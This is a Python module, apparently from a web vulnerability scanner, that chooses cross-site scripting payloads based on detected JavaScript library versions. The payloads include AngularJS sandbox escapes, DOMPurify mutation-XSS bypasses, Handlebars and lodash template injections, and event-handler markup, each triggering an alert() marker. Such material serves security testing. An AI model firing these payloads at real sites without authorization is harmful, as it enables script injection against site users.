"""Library-aware payload gadgets.

Detected libraries are turned into targeted vectors instead of relying only on
generic markup. Version gates come from xf_libscan's advisory database; the
`need` field is a substring that must appear in the page before a gadget is
offered (so we do not spray Angular vectors at a jQuery-only app).
"""
import re

import xf_libscan

GADGETS = [
    {
        "library": "jQuery", "max": "3.4.1",
        "name": "gadget:jquery-html-script",
        "need": ("jquery",),
        "why": "jQuery <3.5 html()/append() parses and can execute scripts",
        "payloads": [
            "<option><style></option></select><img src=x onerror=alert('__M__')></style>",
            "<style><style /><img src=x onerror=alert('__M__')>",
            "<img src=x onerror=alert('__M__')>",
            "<script>alert('__M__')</script>",
            "<svg/onload=alert('__M__')>",
        ],
    },
    {
        "library": "AngularJS", "max": "1.8.3",
        "name": "gadget:angularjs-sandbox-escape",
        "need": ("ng-app", "angular"),
        "why": "AngularJS sandbox escape via template expression",
        "payloads": [
            "{{constructor.constructor(\"alert('__M__')\")()}}",
            "{{$eval.constructor(\"alert('__M__')\")()}}",
            "{{x=constructor.constructor('alert(\"__M__\")')()}}",
            "<div ng-app>{{constructor.constructor('alert(\"__M__\")')()}}</div>",
        ],
    },
    {
        "library": "Angular", "max": "18.2.15",
        "name": "gadget:angular-i18n",
        "need": ("ng-version", "angular"),
        "why": "Angular i18n/template namespace bypass",
        "payloads": [
            "{{constructor.constructor(\"alert('__M__')\")()}}",
            "<img src=x onerror=alert('__M__')>",
        ],
    },
    {
        "library": "DOMPurify", "max": "3.1.2",
        "name": "gadget:dompurify-mxss",
        "need": ("dompurify",),
        "why": "DOMPurify mXSS re-contextualization bypass (<3.1.3)",
        "payloads": [
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('__M__')>",
            "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert('__M__')>",
            "<svg><p><style><img src=x onerror=alert('__M__')></style></p></svg>",
        ],
    },
    {
        "library": "Bootstrap", "max": "4.6.2",
        "name": "gadget:bootstrap-tooltip",
        "need": ("bootstrap",),
        "why": "Bootstrap tooltip/popover data-html XSS",
        "payloads": [
            "<a data-toggle=tooltip data-html=true title=\"<img src=x onerror=alert('__M__')>\">x</a>",
            "<button data-toggle=popover data-html=true data-content=\"<svg onload=alert('__M__')>\">x</button>",
        ],
    },
    {
        "library": "Handlebars", "max": "4.7.7",
        "name": "gadget:handlebars-template",
        "need": ("handlebars",),
        "why": "Handlebars template injection / prototype pollution",
        "payloads": [
            "{{#with \"s\" as |s|}}{{#with \"e\" as |e|}}{{#with \"constructor\" as |c|}}{{c.constructor(\"alert('__M__')\")()}}{{/with}}{{/with}}{{/with}}",
            "{{constructor.constructor(\"alert('__M__')\")()}}",
        ],
    },
    {
        "library": "lodash", "max": "4.17.20",
        "name": "gadget:lodash-template",
        "need": ("lodash", "_.template"),
        "why": "lodash template injection (CVE-2021-23337 family)",
        "payloads": [
            "<%= alert('__M__') %>",
            "${alert('__M__')}",
        ],
    },
    {
        "library": "React", "max": "99.0.0",
        "name": "gadget:react-dangerous-html",
        "need": ("react",),
        "why": "React dangerouslySetInnerHTML renders raw markup",
        "payloads": [
            "<img src=x onerror=alert('__M__')>",
            "<svg/onload=alert('__M__')>",
        ],
    },
    {
        "library": "Vue", "max": "3.9.9",
        "name": "gadget:vue-v-html",
        "need": ("vue",),
        "why": "Vue v-html sink renders raw markup",
        "payloads": [
            "<img src=x onerror=alert('__M__')>",
            "<svg/onload=alert('__M__')>",
        ],
    },
    {
        "library": "prototype", "max": "1.7.3",
        "name": "gadget:prototype-legacy",
        "need": ("prototype",),
        "why": "legacy Prototype.js XSS",
        "payloads": [
            "<img src=x onerror=alert('__M__')>",
            "<a href=\"javascript:alert('__M__')\">x</a>",
        ],
    },
]


def _ver(s):
    m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", str(s or ""))
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3) or 0))


def _vuln(version, maximum):
    v, m = _ver(version), _ver(maximum)
    if not v or not m:
        return False
    return v <= m


def libraries(html):
    """Return {library: version} detected from a page body."""
    try:
        return xf_libscan.detect_from_text(html or "")
    except Exception:
        return {}


def gadgets_for(html, libs=None, limit=40):
    """Return [(name, payload)] targeted at the libraries present in html."""
    libs = libs if libs is not None else libraries(html)
    low = (html or "").lower()
    out = []
    seen = set()
    for g in GADGETS:
        ver = libs.get(g["library"])
        if not ver or not _vuln(ver, g["max"]):
            continue
        if low and g.get("need") and not any(n.lower() in low for n in g["need"]):
            continue
        for payload in g["payloads"]:
            if payload in seen:
                continue
            seen.add(payload)
            out.append(("%s:%s" % (g["name"], g["library"]), payload))
            if len(out) >= limit:
                return out
    return out
